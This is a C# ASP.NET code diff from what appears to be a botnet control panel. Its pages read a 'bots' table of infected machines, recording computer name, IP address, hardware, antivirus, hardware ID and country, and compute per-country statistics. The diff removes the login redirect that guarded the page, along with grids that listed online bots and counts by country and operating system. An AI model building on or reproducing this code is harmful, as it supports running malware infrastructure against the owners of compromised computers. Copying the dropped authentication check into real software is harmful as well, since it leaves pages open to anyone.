@@ -4,17 +4,12 @@ using System.Data;
 using System.Web;
 using System.Web.UI.WebControls;
 
-public partial class Home : System.Web.UI.Page
+public partial class Tasks : System.Web.UI.Page
 {
     public string kleurSyntax;
     public string procentSyntax;
-    public void Page_Load(object sender, EventArgs e)
+    protected void Page_Load(object sender, EventArgs e)
     {
-        if ((Session["Check"] == null) || (Convert.ToBoolean(Session["Check"]) == false))
-        {
-            Response.Redirect("Login.aspx");
-        }
-
         using (SqlConnection conn = new SqlConnection("Data Source=localhost;Initial Catalog=Kennedy;Integrated Security=True"))
         {
             conn.Open();
@@ -67,7 +62,7 @@ public partial class Home : System.Web.UI.Page
             {
                 connMonth = (int)cmd.ExecuteScalar();
                 lblConnectionsMonth.Text = connMonth.ToString();
-                connMonthPre = Math.Round((double)(100 * connMonth) / connTotal , 1);
+                connMonthPre = Math.Round((double)(100 * connMonth) / connTotal, 1);
                 connMonthPrec.Text = "data-percent=\"" + connMonthPre + "\"";
 
             }
@@ -81,7 +76,7 @@ public partial class Home : System.Web.UI.Page
             int[] landAantal = new int[amountOfCountrys];
 
             for (int i = 1; i < amountOfCountrys; i++)
-            { 
+            {
                 using (SqlCommand cmd = new SqlCommand("select Country from(select distinct Country, DENSE_RANK() over (order by country) as rownum from bots) as tbl where tbl.rownum = @i", conn))
                 {
                     cmd.Parameters.AddWithValue("i", i);
@@ -94,90 +89,11 @@ public partial class Home : System.Web.UI.Page
                     landAantal[i] = (int)cmd.ExecuteScalar();
                 }
 
-                procent = Math.Round((double)(100 * landAantal[i]) / connTotal , 1);
+                procent = Math.Round((double)(100 * landAantal[i]) / connTotal, 1);
 
                 kleurSyntax += "\"" + land[i] + "\" " + ":" + landAantal[i] + ", ";
                 procentSyntax += "\"" + land[i] + "\" " + ":" + procent + ", ";
             }
-
-            using (SqlCommand cmd = new SqlCommand("SELECT BotID,PCName,IP,CPU,GPU,FirstConn,LastConn,OperatingSystem,Country,Region,Antivirus,HWID,Version FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE())));", conn))
-            {
-                DataSet ds = new DataSet();
-                SqlDataReader reader = cmd.ExecuteReader();
-                grdOnline.DataSource = reader;
-                grdOnline.DataBind();
-                reader.Close();
-            }
-
-            using (SqlCommand cmd = new SqlCommand("select country, count(Country)  from bots group by Country", conn))
-            {
-                DataSet ds = new DataSet();
-                SqlDataReader reader = cmd.ExecuteReader();
-                grdCountry.DataSource = reader;
-                grdCountry.DataBind();
-                reader.Close();
-            }
-
-            using (SqlCommand cmd = new SqlCommand("select OperatingSystem, count(OperatingSystem)from bots group by OperatingSystem", conn))
-            {
-                DataSet ds = new DataSet();
-                SqlDataReader reader = cmd.ExecuteReader();
-                grdOS.DataSource = reader;
-                grdOS.DataBind();
-                reader.Close();
-            }
         }
     }
-    protected void grdOnline_RowDataBound (object sender, GridViewRowEventArgs e)
-    {
-        if (e.Row.RowType == DataControlRowType.Header)
-        {
-            e.Row.Cells[0].Text = "NO.";
-            e.Row.Cells[1].Text = "COMPUTER NAME";
-            e.Row.Cells[2].Text = "IP ADDRESS";
-            e.Row.Cells[3].Text = "CPU";
-            e.Row.Cells[4].Text = "GPU";
-            e.Row.Cells[5].Text = "INSTALLED";
-            e.Row.Cells[6].Text = "LAST CONNECTION";
-            e.Row.Cells[7].Text = "OPERATING SYSTEM";
-            e.Row.Cells[8].Text = "COUNTRY";
-            e.Row.Cells[9].Text = "REGION";
-            e.Row.Cells[10].Text = "ANTIVIRUS";
-            e.Row.Cells[11].Text = "HARDWAREID";
-            e.Row.Cells[12].Text = "VERSION";
-        }
-        foreach (TableCell tc in e.Row.Cells)
-        {
-            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
-        }
-    }
-
-    protected void grdCountry_RowDataBound(object sender, GridViewRowEventArgs e)
-    {
-        if (e.Row.RowType == DataControlRowType.Header)
-        {
-            e.Row.Cells[0].Text = "COUNTRY";
-            e.Row.Cells[1].Text = "AMOUNT";
-        }
-        foreach (TableCell tc in e.Row.Cells)
-        {
-            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
-        }
-    }
-
-    protected void grdOS_RowDataBound(object sender, GridViewRowEventArgs e)
-    {
-        if (e.Row.RowType == DataControlRowType.Header)
-        {
-            e.Row.Cells[0].Text = "OPERATING SYSTEM";
-            e.Row.Cells[1].Text = "AMOUNT";
-        }
-        foreach (TableCell tc in e.Row.Cells)
-        {
-            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
-        }
-    }
-
-
-
 }
